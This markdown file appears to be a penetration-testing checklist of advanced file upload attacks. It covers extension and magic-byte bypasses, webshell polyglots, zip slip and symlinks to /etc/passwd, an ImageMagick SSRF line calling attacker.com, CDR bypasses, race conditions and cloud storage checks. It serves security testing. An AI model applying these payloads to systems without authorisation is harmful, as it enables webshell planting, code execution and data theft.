---
name: Advanced File Upload Attacks
category: web-security
description: Comprehensive file upload testing — archive attacks, ImageMagick, cloud storage, CDR bypass, serverless image proxy
tags: [file-upload, webshell, polyglot, zip-slip, imagemagick]
---

## Advanced File Upload Attacks

### Extension Bypass Techniques
- Double extension: `shell.php.jpg`
- Trailing chars: `shell.php.`, `shell.php ` (space)
- Null byte: `shell.php%00.jpg`
- Case swap: `shell.PhP`, `shell.pHp`
- Alternative extensions: `.php5`, `.phtml`, `.phar`, `.php7`, `.shtml`
- `.htaccess` upload for custom handler: `AddType application/x-httpd-php .txt`
- `.user.ini` upload for PHP: `auto_prepend_file=shell.gif`

### Content-Type / Magic Byte Bypass
- Change Content-Type to `image/jpeg`, `application/pdf`
- Add magic bytes: `GIF89a` before PHP code (GIF polyglot)
- PNG polyglot: PNG header + PHP payload in tEXt chunk
- PDF polyglot: PDF header + JS in XML metadata
- Exif polyglot: embed payload in EXIF data

### Archive / Zip Slip
- Zip slip: symlink in zip → extract to parent directory
- Path traversal in archive: `../../../etc/cron.d/malicious`
- Tar: setuid binaries via preserved permissions
- Zip symlink: `ln -s /etc/passwd sym.txt → zip --symlinks`
- RAR: absolute path extraction
- 7z: SFX archive code execution

### ImageMagick / Graphics Library Attacks
- `.mvg` file SSRF: `viewbox https://attacker.com/`
- `msl:` wrapper RCE via MSL file
- `ephemeral:` temporary file read
- `gifoeb:` memory disclosure (tiff with custom tag)
- Ghostscript RCE (CVE-2024-29510)
- HEIC/AVIF processing: heap overflow via crafted image

### Cloud / Object Storage
- S3 presigned URL enforcement bypass
- S3 Object Lock configuration review
- IAM role restriction testing
- V4 signature enforcement check
- Azure Blob anonymous access
- GCP Cloud Storage public bucket detection

### CDR (Content Disarm & Reconstruction) Bypass
- Deeply nested archive bombs
- Macros in DOCX/XLSX with VBA stomping
- OLE objects in Office documents
- DDE (Dynamic Data Exchange) in Word docs
- SLK (Symbolic Link) formula injection in Excel

### Race Conditions in Upload
- Chunked upload validation bypass
- Simultaneous parallel uploads (TOCTOU)
- Temporary file access during processing
- CDN cache poisoning via parallel upload

### Serverless Image Proxy Attacks
- imgproxy SSRF via `?url=` parameter
- Thumbor path traversal
- Lambda function image handler abuse
- Image resize OOM DoS

### Extension Impact Matrix
| Extension | Risk | Action |
|-----------|------|--------|
| .wasm | High | WASM binary execution |
| .svg | High | XSS via script tags, XXE |
| .webp | Medium | Heap overflow in decoders |
| .avif | Medium | Parser bugs in AV1 decode |
| .xml | High | XXE, DTD inclusion |
| .docm | High | Macro execution |
| .xll | High | Excel DLL loading |
